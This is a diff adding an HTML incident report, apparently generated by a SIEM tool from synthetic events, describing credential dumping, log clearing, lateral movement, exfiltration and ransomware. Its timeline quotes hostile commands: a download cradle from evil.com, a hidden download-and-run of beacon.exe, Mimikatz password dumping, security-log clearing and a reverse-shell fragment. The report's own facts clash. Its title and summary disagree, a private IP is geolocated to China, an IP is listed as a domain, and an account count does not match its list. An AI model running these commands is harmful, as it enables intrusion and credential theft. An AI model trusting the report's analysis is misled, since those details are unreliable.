@@ -1,0 +1,849 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>INC-2025-008: Insider Threat — Data Exfiltration</title>
+    <style>
+        :root {
+            --primary: #1a237e;
+            --primary-light: #3f51b5;
+            --danger: #ff1744;
+            --warning: #ff9100;
+            --success: #00c853;
+            --dark: #212121;
+            --light: #fafafa;
+            --border: #e0e0e0;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f5f5;
+            color: var(--dark);
+            line-height: 1.6;
+        }
+        .report-container {
+            max-width: 1000px;
+            margin: 20px auto;
+            background: white;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.1);
+        }
+        .report-header {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+            color: white;
+            padding: 40px;
+        }
+        .report-header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            letter-spacing: -0.5px;
+        }
+        .report-header .meta {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 20px;
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        .severity-badge {
+            display: inline-block;
+            padding: 4px 16px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 14px;
+            background: #ff6d00;
+            color: white;
+        }
+        .section {
+            padding: 30px 40px;
+            border-bottom: 1px solid var(--border);
+        }
+        .section h2 {
+            color: var(--primary);
+            font-size: 22px;
+            margin-bottom: 15px;
+            padding-bottom: 8px;
+            border-bottom: 2px solid var(--primary-light);
+        }
+        .section h3 {
+            color: var(--primary-light);
+            font-size: 17px;
+            margin: 15px 0 8px 0;
+        }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .stat-card {
+            background: var(--light);
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            border-left: 4px solid var(--primary-light);
+        }
+        .stat-card .number {
+            font-size: 32px;
+            font-weight: bold;
+            color: var(--primary);
+        }
+        .stat-card .label {
+            font-size: 13px;
+            color: #666;
+            margin-top: 5px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+        th, td {
+            padding: 10px 12px;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th {
+            background: #e8eaf6;
+            color: var(--primary);
+            font-weight: 600;
+        }
+        tr:hover { background: #f5f5f5; }
+        .timeline-event {
+            display: flex;
+            gap: 15px;
+            padding: 10px 0;
+            border-left: 3px solid var(--primary-light);
+            padding-left: 15px;
+            margin: 10px 0;
+        }
+        .timeline-event .time {
+            min-width: 85px;
+            color: #666;
+            font-size: 13px;
+        }
+        .timeline-event .content {
+            flex: 1;
+        }
+        .timeline-event .sev-tag {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 3px;
+            font-size: 11px;
+            font-weight: bold;
+            color: white;
+        }
+        .tag-CRITICAL { background: #ff1744; }
+        .tag-HIGH { background: #ff6d00; }
+        .tag-MEDIUM { background: #ffc400; color: #333; }
+        .tag-LOW { background: #00c853; }
+        .tag-INFO { background: #2979ff; }
+        .remediation-box {
+            background: #e8f5e9;
+            border: 1px solid #a5d6a7;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 10px 0;
+        }
+        .remediation-box.immediate {
+            background: #ffebee;
+            border-color: #ef9a9a;
+        }
+        .remediation-box.short-term {
+            background: #fff3e0;
+            border-color: #ffcc80;
+        }
+        .ioc-tag {
+            display: inline-block;
+            background: #e8eaf6;
+            padding: 3px 10px;
+            border-radius: 3px;
+            margin: 3px;
+            font-family: monospace;
+            font-size: 13px;
+        }
+        .mitre-technique {
+            background: var(--light);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px 0;
+            border-left: 4px solid var(--warning);
+        }
+        .footer {
+            padding: 20px 40px;
+            background: var(--light);
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+        }
+        .kill-chain-flow {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 5px;
+            align-items: center;
+            margin: 15px 0;
+        }
+        .kill-chain-step {
+            background: var(--primary);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        .kill-chain-arrow {
+            font-size: 20px;
+            color: #999;
+        }
+        @media print {
+            .report-container { box-shadow: none; margin: 0; }
+            .section { page-break-inside: avoid; }
+        }
+    </style>
+</head>
+<body>
+    <div class="report-container">
+        <!-- Header -->
+        <div class="report-header">
+            <div style="display:flex;justify-content:space-between;align-items:start;">
+                <div>
+                    <h1>INC-2025-008: Insider Threat — Data Exfiltration</h1>
+                    <span class="severity-badge">HIGH</span>
+                </div>
+                <div style="text-align:right;">
+                    <div style="font-size:24px;font-weight:bold;">GUARDIAN SIEM</div>
+                    <div style="opacity:0.8;">Incident Response Report</div>
+                </div>
+            </div>
+            <div class="meta">
+                <div><strong>Incident ID:</strong> INC-2026-0213-1448</div>
+                <div><strong>Classification:</strong> Security Incident</div>
+                <div><strong>Generated:</strong> February 13, 2026 14:48 UTC</div>
+                <div><strong>Analyst:</strong> Guardian SIEM Automated Analysis</div>
+            </div>
+        </div>
+
+        <!-- Key Metrics -->
+        <div class="section">
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="number">392</div>
+                    <div class="label">Total Events</div>
+                </div>
+                <div class="stat-card">
+                    <div class="number" style="color:#ff1744">65</div>
+                    <div class="label">Critical Alerts</div>
+                </div>
+                <div class="stat-card">
+                    <div class="number">12</div>
+                    <div class="label">MITRE Techniques</div>
+                </div>
+                <div class="stat-card">
+                    <div class="number">6</div>
+                    <div class="label">Unique Source IPs</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 1. Executive Summary -->
+        <div class="section">
+            <h2>1. Executive Summary</h2>
+            <p>
+            Guardian SIEM detected a <strong>high-severity ransomware deployment</strong>
+            event originating from CN. The incident involved <strong>392 security events</strong> across
+            <strong>12 MITRE ATT&amp;CK techniques</strong>, with <strong>65 critical</strong>
+            and <strong>78 high-severity alerts</strong> generated.
+        </p>
+        <p style="margin-top:10px;">
+            The attack involved <strong>6 unique source IP address(es)</strong>
+            communicating with internal systems. Compromised accounts include: <strong>CORP\admin, CORP\compromised_admin, CORP\administrator</strong>.
+        </p>
+        <p style="margin-top:10px;">
+            <strong>Business Impact:</strong> Potentially catastrophic. Ransomware encryption and shadow copy deletion detected.
+        </p>
+        <p style="margin-top:10px;">
+            <strong>Recommended Action:</strong> Escalate to senior analyst for triage and containment assessment.
+        </p>
+        </div>
+
+        <!-- 2. Kill Chain Analysis -->
+        <div class="section">
+            <h2>2. Attack Kill Chain</h2>
+            <div class="kill-chain-flow"><div class="kill-chain-step">Execution<br><small>Command and Scripting Interpreter, PowerShell</small></div><span class="kill-chain-arrow"> &#10132; </span><div class="kill-chain-step">Persistence<br><small>Windows Service</small></div><span class="kill-chain-arrow"> &#10132; </span><div class="kill-chain-step">Defense Evasion<br><small>Clear Windows Event Logs</small></div><span class="kill-chain-arrow"> &#10132; </span><div class="kill-chain-step">Credential Access<br><small>Brute Force, OS Credential Dumping, Kerberoasting</small></div><span class="kill-chain-arrow"> &#10132; </span><div class="kill-chain-step">Discovery<br><small>Network Service Scanning</small></div><span class="kill-chain-arrow"> &#10132; </span><div class="kill-chain-step">Lateral Movement<br><small>Remote Desktop Protocol</small></div><span class="kill-chain-arrow"> &#10132; </span><div class="kill-chain-step">Exfiltration<br><small>Exfiltration Over C2 Channel</small></div><span class="kill-chain-arrow"> &#10132; </span><div class="kill-chain-step">Impact<br><small>Data Encrypted for Impact</small></div></div>
+        </div>
+
+        <!-- 3. Technical Analysis & Timeline -->
+        <div class="section">
+            <h2>3. Technical Analysis</h2>
+            <h3>3.1 MITRE ATT&amp;CK Mapping</h3>
+            
+            <div class="mitre-technique">
+                <strong>T1003: OS Credential Dumping</strong>
+                <span style="float:right;color:#666;">Credential Access | 32 events | Threat Score: 99</span>
+                <br><span style="font-size:13px;color:#555;">Adversaries may attempt to dump credentials from the OS for lateral movement.</span>
+                <br><small style="color:#999;">Data Sources: Process Monitoring, API Monitoring, PowerShell Logs</small>
+            </div>
+
+            <div class="mitre-technique">
+                <strong>T1021.001: Remote Desktop Protocol</strong>
+                <span style="float:right;color:#666;">Lateral Movement | 14 events | Threat Score: 78</span>
+                <br><span style="font-size:13px;color:#555;">Adversaries may use RDP to move laterally across a network.</span>
+                <br><small style="color:#999;">Data Sources: Authentication Logs, Logon Sessions</small>
+            </div>
+
+            <div class="mitre-technique">
+                <strong>T1041: Exfiltration Over C2 Channel</strong>
+                <span style="float:right;color:#666;">Exfiltration | 16 events | Threat Score: 88</span>
+                <br><span style="font-size:13px;color:#555;">Adversaries may steal data by exfiltrating it over an existing C2 channel.</span>
+                <br><small style="color:#999;">Data Sources: Network Traffic, Netflow/Enclave Netflow</small>
+            </div>
+
+            <div class="mitre-technique">
+                <strong>T1046: Network Service Scanning</strong>
+                <span style="float:right;color:#666;">Discovery | 180 events | Threat Score: 55</span>
+                <br><span style="font-size:13px;color:#555;">Adversaries may scan for services to identify targets for lateral movement.</span>
+                <br><small style="color:#999;">Data Sources: Network Traffic, Firewall Logs, IDS/IPS</small>
+            </div>
+
+            <div class="mitre-technique">
+                <strong>T1059: Command and Scripting Interpreter</strong>
+                <span style="float:right;color:#666;">Execution | 6 events | Threat Score: 99</span>
+                <br><span style="font-size:13px;color:#555;">Adversaries may abuse command and script interpreters to execute commands.</span>
+                <br><small style="color:#999;">Data Sources: Process Monitoring, Process Command-line Parameters</small>
+            </div>
+
+            <div class="mitre-technique">
+                <strong>T1059.001: PowerShell</strong>
+                <span style="float:right;color:#666;">Execution | 21 events | Threat Score: 92</span>
+                <br><span style="font-size:13px;color:#555;">Adversaries may abuse PowerShell for execution of commands and scripts.</span>
+                <br><small style="color:#999;">Data Sources: PowerShell Logs, Process Monitoring, Script Block Logging</small>
+            </div>
+
+            <div class="mitre-technique">
+                <strong>T1070.001: Clear Windows Event Logs</strong>
+                <span style="float:right;color:#666;">Defense Evasion | 24 events | Threat Score: 97</span>
+                <br><span style="font-size:13px;color:#555;">Adversaries may clear logs to remove evidence of intrusion activities.</span>
+                <br><small style="color:#999;">Data Sources: Windows Event Logs, API Monitoring</small>
+            </div>
+
+            <div class="mitre-technique">
+                <strong>T1110: Brute Force</strong>
+                <span style="float:right;color:#666;">Credential Access | 52 events | Threat Score: 90</span>
+                <br><span style="font-size:13px;color:#555;">Adversaries may use brute force techniques to gain access to accounts.</span>
+                <br><small style="color:#999;">Data Sources: Authentication Logs, Account Monitoring</small>
+            </div>
+
+            <div class="mitre-technique">
+                <strong>T1486: Data Encrypted for Impact</strong>
+                <span style="float:right;color:#666;">Impact | 12 events | Threat Score: 100</span>
+                <br><span style="font-size:13px;color:#555;">Adversaries may encrypt data on target systems to interrupt availability.</span>
+                <br><small style="color:#999;">Data Sources: File Monitoring, Process Monitoring</small>
+            </div>
+
+            <div class="mitre-technique">
+                <strong>T1530: Unknown</strong>
+                <span style="float:right;color:#666;">Reconnaissance | 6 events | Threat Score: 60</span>
+                <br><span style="font-size:13px;color:#555;"></span>
+                <br><small style="color:#999;">Data Sources: N/A</small>
+            </div>
+
+            <div class="mitre-technique">
+                <strong>T1543.003: Windows Service</strong>
+                <span style="float:right;color:#666;">Persistence | 8 events | Threat Score: 80</span>
+                <br><span style="font-size:13px;color:#555;">Adversaries may create new services for persistence or privilege escalation.</span>
+                <br><small style="color:#999;">Data Sources: Service Monitoring, Windows Event Logs</small>
+            </div>
+
+            <div class="mitre-technique">
+                <strong>T1558.003: Kerberoasting</strong>
+                <span style="float:right;color:#666;">Credential Access | 21 events | Threat Score: 90</span>
+                <br><span style="font-size:13px;color:#555;">Adversaries may request service tickets for service accounts with SPNs to crack offline.</span>
+                <br><small style="color:#999;">Data Sources: Windows Event Logs (4769), Active Directory</small>
+            </div>
+            <h3>3.2 Event Timeline</h3>
+            
+            <div class="timeline-event">
+                <div class="time">14:46:27</div>
+                <div class="content">
+                    <span class="sev-tag tag-CRITICAL">CRITICAL</span>
+                    <strong> [Windows_EventLog]</strong>
+                    <span style="color:#666;"> (T1070.001)</span>
+                    <span style="color:#388e3c;"> Rule: Log Tampering</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 1102: The audit log was cleared. Subject: CORP\compromised_admin. LogName: Security. This action was performed by wevtutil.exe</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:27</div>
+                <div class="content">
+                    <span class="sev-tag tag-HIGH">HIGH</span>
+                    <strong> [Windows_Sysmon]</strong>
+                    <span style="color:#666;"> (T1070.001)</span>
+                    <span style="color:#388e3c;"> Rule: Event Log Manipulation</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 1: Process Create. Image: C:\Windows\System32\wevtutil.exe CommandLine: wevtutil cl Security ParentImage: C:\Windows\System32\cmd.exe User: CORP\compromised_admin</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:27</div>
+                <div class="content">
+                    <span class="sev-tag tag-CRITICAL">CRITICAL</span>
+                    <strong> [Windows_PowerShell]</strong>
+                    <span style="color:#666;"> (T1059.001)</span>
+                    <span style="color:#388e3c;"> Rule: PowerShell Download Cradle</span>
+                    <br><span style="font-size:13px;color:#555;">PowerShell ScriptBlock ID 0xAB12: IEX(New-Object Net.WebClient).downloadstring('http://evil.com/payload.ps1') | Invoke-Expression</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:27</div>
+                <div class="content">
+                    <span class="sev-tag tag-HIGH">HIGH</span>
+                    <strong> [Windows_Sysmon]</strong>
+                    <span style="color:#666;"> (T1059.001)</span>
+                    <span style="color:#388e3c;"> Rule: Encoded PowerShell</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 1: Process Create. Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwA= ParentImage: C:\Windows\System32</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:27</div>
+                <div class="content">
+                    <span class="sev-tag tag-HIGH">HIGH</span>
+                    <strong> [Windows_PowerShell]</strong>
+                    <span style="color:#666;"> (T1059.001)</span>
+                    <span style="color:#388e3c;"> Rule: Suspicious Download</span>
+                    <br><span style="font-size:13px;color:#555;">PowerShell Module logging: Invoke-WebRequest -Uri 'http://203.0.113.99/beacon.exe' -OutFile 'C:\Users\Public\svchost.exe'; Start-Process 'C:\Users\Public\svchost.exe' -WindowStyle Hidden</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:28</div>
+                <div class="content">
+                    <span class="sev-tag tag-CRITICAL">CRITICAL</span>
+                    <strong> [Windows_EventLog]</strong>
+                    <span style="color:#666;"> (T1003)</span>
+                    <span style="color:#388e3c;"> Rule: Credential Dumping</span>
+                    <br><span style="font-size:13px;color:#555;">Process access to LSASS.exe detected. Source: mimikatz.exe (PID 4402) requested PROCESS_VM_READ on lsass.exe (PID 672). GrantedAccess: 0x1010. User: CORP\admin</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:28</div>
+                <div class="content">
+                    <span class="sev-tag tag-CRITICAL">CRITICAL</span>
+                    <strong> [Windows_Sysmon]</strong>
+                    <span style="color:#666;"> (T1003)</span>
+                    <span style="color:#388e3c;"> Rule: LSASS Access</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 10: ProcessAccess. SourceImage: C:\Users\admin\Downloads\mimikatz.exe TargetImage: C:\Windows\System32\lsass.exe CallTrace: ntdll.dll!NtReadVirtualMemory</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:28</div>
+                <div class="content">
+                    <span class="sev-tag tag-HIGH">HIGH</span>
+                    <strong> [Windows_EventLog]</strong>
+                    <span style="color:#666;"> (T1003)</span>
+                    <span style="color:#388e3c;"> Rule: Privilege Escalation</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 4672: Special privileges assigned to new logon. Subject: CORP\admin. Privileges: SeDebugPrivilege</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:28</div>
+                <div class="content">
+                    <span class="sev-tag tag-CRITICAL">CRITICAL</span>
+                    <strong> [Windows_PowerShell]</strong>
+                    <span style="color:#666;"> (T1003)</span>
+                    <span style="color:#388e3c;"> Rule: Suspicious PowerShell</span>
+                    <br><span style="font-size:13px;color:#555;">PowerShell ScriptBlock logging: Invoke-Mimikatz -Command 'sekurlsa::logonpasswords' | Out-File C:\temp\creds.txt</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:29</div>
+                <div class="content">
+                    <span class="sev-tag tag-HIGH">HIGH</span>
+                    <strong> [Windows_EventLog]</strong>
+                    <span style="color:#666;"> (T1558.003)</span>
+                    <span style="color:#388e3c;"> Rule: Kerberoasting</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 4769: A Kerberos service ticket was requested. Account: CORP\jsmith. Service: MSSQLSvc/sql01.corp.local:1433. Ticket Encryption: 0x17 (RC4-HMAC). Client Address: 192.168.1.50. This encryption</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:29</div>
+                <div class="content">
+                    <span class="sev-tag tag-HIGH">HIGH</span>
+                    <strong> [Windows_EventLog]</strong>
+                    <span style="color:#666;"> (T1558.003)</span>
+                    <span style="color:#388e3c;"> Rule: Kerberoasting</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 4769: A Kerberos service ticket was requested. Account: CORP\jsmith. Service: HTTP/web01.corp.local. Ticket Encryption: 0x17 (RC4-HMAC). Client Address: 192.168.1.50</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:29</div>
+                <div class="content">
+                    <span class="sev-tag tag-HIGH">HIGH</span>
+                    <strong> [Windows_EventLog]</strong>
+                    <span style="color:#666;"> (T1558.003)</span>
+                    <span style="color:#388e3c;"> Rule: Kerberoasting</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 4769: A Kerberos service ticket was requested. Account: CORP\jsmith. Service: CIFS/file01.corp.local. Ticket Encryption: 0x17 (RC4-HMAC). Client Address: 192.168.1.50. 3 RC4 service ticket re</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:30</div>
+                <div class="content">
+                    <span class="sev-tag tag-HIGH">HIGH</span>
+                    <strong> [Windows_EventLog]</strong>
+                    <span style="color:#666;"> (T1021.001)</span>
+                    <span style="color:#388e3c;"> Rule: Lateral Movement</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 4624: Logon Type 10 (RemoteInteractive). Account: CORP\compromised_admin. Source IP: 192.168.1.50. Target: FILE01.corp.local. Second RDP session from same host in 5 minutes.</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:31</div>
+                <div class="content">
+                    <span class="sev-tag tag-CRITICAL">CRITICAL</span>
+                    <strong> [Windows_EventLog]</strong>
+                    <span style="color:#666;"> (T1070.001)</span>
+                    <span style="color:#388e3c;"> Rule: Log Tampering</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 1102: The audit log was cleared. Subject: CORP\compromised_admin. LogName: Security. This action was performed by wevtutil.exe</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:31</div>
+                <div class="content">
+                    <span class="sev-tag tag-HIGH">HIGH</span>
+                    <strong> [Windows_Sysmon]</strong>
+                    <span style="color:#666;"> (T1070.001)</span>
+                    <span style="color:#388e3c;"> Rule: Event Log Manipulation</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 1: Process Create. Image: C:\Windows\System32\wevtutil.exe CommandLine: wevtutil cl Security ParentImage: C:\Windows\System32\cmd.exe User: CORP\compromised_admin</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:32</div>
+                <div class="content">
+                    <span class="sev-tag tag-HIGH">HIGH</span>
+                    <strong> [Network_IPS]</strong>
+                    <span style="color:#666;"> (T1041)</span>
+                    <span style="color:#388e3c;"> Rule: Data Exfiltration</span>
+                    <br><span style="font-size:13px;color:#555;">Large outbound transfer detected: 192.168.1.50 -> 198.51.100.77:443 transferred 847 MB in 12 minutes. Protocol: HTTPS. Normal baseline for this host: 50 MB/day</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:33</div>
+                <div class="content">
+                    <span class="sev-tag tag-CRITICAL">CRITICAL</span>
+                    <strong> [Windows_EventLog]</strong>
+                    <span style="color:#666;"> (T1003)</span>
+                    <span style="color:#388e3c;"> Rule: Credential Dumping</span>
+                    <br><span style="font-size:13px;color:#555;">Process access to LSASS.exe detected. Source: mimikatz.exe (PID 4402) requested PROCESS_VM_READ on lsass.exe (PID 672). GrantedAccess: 0x1010. User: CORP\admin</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:33</div>
+                <div class="content">
+                    <span class="sev-tag tag-CRITICAL">CRITICAL</span>
+                    <strong> [Windows_Sysmon]</strong>
+                    <span style="color:#666;"> (T1003)</span>
+                    <span style="color:#388e3c;"> Rule: LSASS Access</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 10: ProcessAccess. SourceImage: C:\Users\admin\Downloads\mimikatz.exe TargetImage: C:\Windows\System32\lsass.exe CallTrace: ntdll.dll!NtReadVirtualMemory</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:33</div>
+                <div class="content">
+                    <span class="sev-tag tag-HIGH">HIGH</span>
+                    <strong> [Windows_EventLog]</strong>
+                    <span style="color:#666;"> (T1003)</span>
+                    <span style="color:#388e3c;"> Rule: Privilege Escalation</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 4672: Special privileges assigned to new logon. Subject: CORP\admin. Privileges: SeDebugPrivilege</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:33</div>
+                <div class="content">
+                    <span class="sev-tag tag-CRITICAL">CRITICAL</span>
+                    <strong> [Windows_PowerShell]</strong>
+                    <span style="color:#666;"> (T1003)</span>
+                    <span style="color:#388e3c;"> Rule: Suspicious PowerShell</span>
+                    <br><span style="font-size:13px;color:#555;">PowerShell ScriptBlock logging: Invoke-Mimikatz -Command 'sekurlsa::logonpasswords' | Out-File C:\temp\creds.txt</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:33</div>
+                <div class="content">
+                    <span class="sev-tag tag-HIGH">HIGH</span>
+                    <strong> [Windows_EventLog]</strong>
+                    <span style="color:#666;"> (T1021.001)</span>
+                    <span style="color:#388e3c;"> Rule: Lateral Movement</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 4624: Logon Type 10 (RemoteInteractive). Account: CORP\compromised_admin. Source IP: 192.168.1.50. Target: FILE01.corp.local. Second RDP session from same host in 5 minutes.</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:33</div>
+                <div class="content">
+                    <span class="sev-tag tag-HIGH">HIGH</span>
+                    <strong> [Network_IPS]</strong>
+                    <span style="color:#666;"> (T1041)</span>
+                    <span style="color:#388e3c;"> Rule: Data Exfiltration</span>
+                    <br><span style="font-size:13px;color:#555;">Large outbound transfer detected: 192.168.1.50 -> 198.51.100.77:443 transferred 847 MB in 12 minutes. Protocol: HTTPS. Normal baseline for this host: 50 MB/day</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:34</div>
+                <div class="content">
+                    <span class="sev-tag tag-CRITICAL">CRITICAL</span>
+                    <strong> [Windows_Sysmon]</strong>
+                    <span style="color:#666;"> (T1059)</span>
+                    <span style="color:#388e3c;"> Rule: Reverse Shell</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 1: Process Create. Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine: powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('198.51.100.77',4444);$s</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:34</div>
+                <div class="content">
+                    <span class="sev-tag tag-CRITICAL">CRITICAL</span>
+                    <strong> [Network_IPS]</strong>
+                    <span style="color:#666;"> (T1059)</span>
+                    <span style="color:#388e3c;"> Rule: C2 Communication</span>
+                    <br><span style="font-size:13px;color:#555;">Outbound connection to known C2: 192.168.1.50 -> 198.51.100.77:4444 Protocol: TCP. Connection type: reverse shell pattern (interactive TTY). Threat intel match: IP flagged by AbuseIPDB (confidence: 97</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:34</div>
+                <div class="content">
+                    <span class="sev-tag tag-CRITICAL">CRITICAL</span>
+                    <strong> [Windows_PowerShell]</strong>
+                    <span style="color:#666;"> (T1059.001)</span>
+                    <span style="color:#388e3c;"> Rule: PowerShell Download Cradle</span>
+                    <br><span style="font-size:13px;color:#555;">PowerShell ScriptBlock ID 0xAB12: IEX(New-Object Net.WebClient).downloadstring('http://evil.com/payload.ps1') | Invoke-Expression</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:34</div>
+                <div class="content">
+                    <span class="sev-tag tag-HIGH">HIGH</span>
+                    <strong> [Windows_Sysmon]</strong>
+                    <span style="color:#666;"> (T1059.001)</span>
+                    <span style="color:#388e3c;"> Rule: Encoded PowerShell</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 1: Process Create. Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwA= ParentImage: C:\Windows\System32</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:34</div>
+                <div class="content">
+                    <span class="sev-tag tag-HIGH">HIGH</span>
+                    <strong> [Windows_PowerShell]</strong>
+                    <span style="color:#666;"> (T1059.001)</span>
+                    <span style="color:#388e3c;"> Rule: Suspicious Download</span>
+                    <br><span style="font-size:13px;color:#555;">PowerShell Module logging: Invoke-WebRequest -Uri 'http://203.0.113.99/beacon.exe' -OutFile 'C:\Users\Public\svchost.exe'; Start-Process 'C:\Users\Public\svchost.exe' -WindowStyle Hidden</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:34</div>
+                <div class="content">
+                    <span class="sev-tag tag-CRITICAL">CRITICAL</span>
+                    <strong> [Windows_EventLog]</strong>
+                    <span style="color:#666;"> (T1070.001)</span>
+                    <span style="color:#388e3c;"> Rule: Log Tampering</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 1102: The audit log was cleared. Subject: CORP\compromised_admin. LogName: Security. This action was performed by wevtutil.exe</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:34</div>
+                <div class="content">
+                    <span class="sev-tag tag-HIGH">HIGH</span>
+                    <strong> [Windows_Sysmon]</strong>
+                    <span style="color:#666;"> (T1070.001)</span>
+                    <span style="color:#388e3c;"> Rule: Event Log Manipulation</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 1: Process Create. Image: C:\Windows\System32\wevtutil.exe CommandLine: wevtutil cl Security ParentImage: C:\Windows\System32\cmd.exe User: CORP\compromised_admin</span>
+                </div>
+            </div>
+
+            <div class="timeline-event">
+                <div class="time">14:46:34</div>
+                <div class="content">
+                    <span class="sev-tag tag-CRITICAL">CRITICAL</span>
+                    <strong> [Windows_EventLog]</strong>
+                    <span style="color:#666;"> (T1110)</span>
+                    <span style="color:#388e3c;"> Rule: Brute Force - Successful</span>
+                    <br><span style="font-size:13px;color:#555;">Event ID 4624: An account was successfully logged on. Subject: CORP\administrator. Logon Type: 10 (RemoteInteractive). Source IP: 203.0.113.42. After 12 failed attempts.</span>
+                </div>
+            </div><p style="color:#999;margin-top:10px;font-size:13px;">Showing 30 of 392 events. 362 additional events omitted for brevity.</p>
+        </div>
+
+        <!-- 4. Indicators of Compromise -->
+        <div class="section">
+            <h2>4. Indicators of Compromise (IOCs)</h2>
+            <h3>IP Addresses (6)</h3>
+<span class="ioc-tag">192.168.1.100</span>
+<span class="ioc-tag">192.168.1.50 (CN, Shanghai)</span>
+<span class="ioc-tag">198.51.100.1</span>
+<span class="ioc-tag">198.51.100.77 (RU, Saint Petersburg)</span>
+<span class="ioc-tag">203.0.113.42 (RU, Moscow)</span>
+<span class="ioc-tag">203.0.113.5</span>
+
+<h3>Domains (2)</h3>
+<span class="ioc-tag">203.0.113.99</span>
+<span class="ioc-tag">evil.com</span>
+<h3>Suspicious File Paths (6)</h3>
+<span class="ioc-tag">C:\ProgramData\svchost.exe</span>
+<span class="ioc-tag">C:\Users\Public\Documents\</span>
+<span class="ioc-tag">C:\Users\Public\Documents\README_DECRYPT.txt.</span>
+<span class="ioc-tag">C:\Users\Public\svchost.exe</span>
+<span class="ioc-tag">C:\Users\admin\Downloads\mimikatz.exe</span>
+<span class="ioc-tag">C:\temp\creds.txt</span>
+<h3>Suspicious Processes (6)</h3>
+<span class="ioc-tag">cmd.exe</span>
+<span class="ioc-tag">lsass.exe</span>
+<span class="ioc-tag">mimikatz.exe</span>
+<span class="ioc-tag">powershell.exe</span>
+<span class="ioc-tag">sc.exe</span>
+<span class="ioc-tag">wevtutil.exe</span>
+<h3>Compromised Accounts (6)</h3>
+<span class="ioc-tag">CORP\admin</span>
+<span class="ioc-tag">CORP\administrator</span>
+<span class="ioc-tag">CORP\compromised_admin</span>
